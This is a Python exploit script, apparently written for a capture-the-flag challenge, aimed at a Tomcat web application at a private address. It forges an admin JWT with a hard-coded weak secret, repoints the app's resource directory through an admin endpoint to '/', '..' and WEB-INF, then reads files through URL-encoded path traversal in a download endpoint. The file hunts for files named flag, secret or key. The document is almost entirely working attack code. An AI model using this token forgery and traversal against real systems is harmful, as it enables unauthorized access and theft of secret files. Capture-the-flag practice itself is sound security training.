#!/usr/bin/env python3
"""
使用admin权限搜索flag
"""

import requests
import jwt
import json
from datetime import datetime, timedelta, timezone

BASE_URL = "http://192.168.18.25:25004"
JWT_SECRET = "secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret"

def create_admin_session():
    """创建带admin JWT的session"""
    payload = {
        "sub": "admin",
        "exp": datetime.now(timezone.utc) + timedelta(minutes=30)
    }
    
    token = jwt.encode(payload, JWT_SECRET, algorithm="HS512")
    
    session = requests.Session()
    session.cookies.set("jwt", token)
    
    print(f"[+] Admin session创建成功")
    return session

def set_resource_dir(session, path):
    """设置resourceDir"""
    r = session.post(f"{BASE_URL}/admin/challengeResourceDir", data={"new-path": path})
    return r.status_code == 200

def list_files(session):
    """列出当前resourceDir的文件"""
    r = session.get(f"{BASE_URL}/dashboard/list")
    if r.status_code == 200:
        try:
            return json.loads(r.text)
        except:
            pass
    return None

def search_for_flag(session, paths_to_try):
    """在多个路径中搜索flag"""
    print("\n[*] 搜索flag文件...")
    
    for path in paths_to_try:
        print(f"\n[*] 检查路径: {path}")
        
        if set_resource_dir(session, path):
            files = list_files(session)
            
            if files:
                for file in files:
                    name = file.get('name', '')
                    path_str = file.get('path', '')
                    
                    # 检查文件名是否包含flag
                    if 'flag' in name.lower() or 'flag' in path_str.lower():
                        print(f"\n[!] 找到可疑文件: {name}")
                        print(f"    路径: {path_str}")
                        print(f"    大小: {file.get('size', 0)} bytes")
                        
                        # 尝试读取文件
                        try_read_file(session, path, path_str)

def try_read_file(session, resource_dir, file_path):
    """尝试读取文件"""
    print(f"\n[*] 尝试读取文件: {file_path}")
    
    # 方法1: 通过download直接读取
    read_path = f"{resource_dir}/{file_path}" if not resource_dir.endswith('/') else f"{resource_dir}{file_path}"
    
    # 使用URL编码绕过
    encoded_path = read_path.replace('/', '%2f')
    r = session.get(f"{BASE_URL}/download?path=uploads%2f..%2f{encoded_path}")
    
    if r.status_code == 200:
        print(f"[+] 成功读取:")
        print(r.text)
        
        if 'pcb{' in r.text or 'flag{' in r.text or 'FLAG{' in r.text:
            print(f"\n[!!! 找到FLAG !!!]")
            print(r.text)
            return True
    
    return False

def explore_root_directory(session):
    """探索根目录寻找flag"""
    print("\n[*] 探索Tomcat/应用根目录...")
    
    # 设置resourceDir为根目录
    set_resource_dir(session, "/")
    files = list_files(session)
    
    if files:
        print(f"\n[*] 根目录文件列表:")
        for file in files:
            name = file.get('name', '')
            is_dir = file.get('isDir', False)
            
            if not is_dir and ('flag' in name.lower() or 'secret' in name.lower() or 'key' in name.lower()):
                print(f"\n[!] 发现可疑文件: {name}")
                
                # 尝试读取
                # 由于resourceDir现在是/，文件路径就是文件名
                r = session.get(f"{BASE_URL}/download?path={name}")
                if r.status_code == 200:
                    print(f"内容:\n{r.text}")
                    
                    if 'pcb{' in r.text or 'flag{' in r.text:
                        print(f"\n[!!! 找到FLAG !!!]")
                        return r.text

def check_webapp_parent(session):
    """检查webapp父目录"""
    print("\n[*] 检查webapp父目录...")
    
    # 尝试设置到webapp父目录
    parent_paths = [
        "..",
        "webapps",
    ]
    
    for path in parent_paths:
        print(f"\n[*] 尝试路径: {path}")
        
        if set_resource_dir(session, path):
            files = list_files(session)
            
            if files:
                print(f"[+] 成功列出文件")
                
                for file in files[:20]:  # 只显示前20个
                    name = file.get('name', '')
                    print(f"  - {name}")
                    
                    if 'flag' in name.lower() or 'key' in name.lower():
                        print(f"\n[!] 发现: {name}")
                        
                        # 尝试读取
                        r = session.get(f"{BASE_URL}/download?path=uploads%2f..%2f..%2f{name}")
                        if r.status_code == 200 and len(r.text) > 0:
                            print(f"内容:\n{r.text}")
                            
                            if 'pcb{' in r.text or 'flag{' in r.text:
                                print(f"\n[!!! 找到FLAG !!!]")
                                return r.text

def main():
    print(f"[*] 使用admin权限搜索flag {BASE_URL}")
    
    session = create_admin_session()
    
    # 探索不同的路径
    paths = [
        "WEB-INF/classes",
        "WEB-INF",
        "/",
        ".",
        "..",
    ]
    
    search_for_flag(session, paths)
    
    # 探索根目录
    flag = explore_root_directory(session)
    if flag:
        return
    
    # 检查父目录
    flag = check_webapp_parent(session)
    if flag:
        return
    
    print("\n[*] 未直接找到flag，但现在有admin权限可以继续探索")

if __name__ == "__main__":
    main()
